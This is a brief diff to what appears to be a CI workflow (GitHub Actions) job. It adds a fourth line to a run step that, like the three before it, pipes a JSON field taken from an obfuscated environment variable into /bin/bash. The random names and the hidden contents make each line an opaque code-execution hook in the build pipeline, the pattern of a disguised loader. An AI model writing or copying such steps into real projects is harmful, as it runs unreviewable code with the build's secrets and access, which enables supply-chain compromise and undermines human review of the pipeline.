@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$eu2533" | jq -r .jo354 | /bin/bash
           printf '%s' "$br5" | jq -r .n350 | /bin/bash
           printf '%s' "$fjom548" | jq -r .rfgym96090 | /bin/bash
+          printf '%s' "$wlw7" | jq -r .hpu7 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
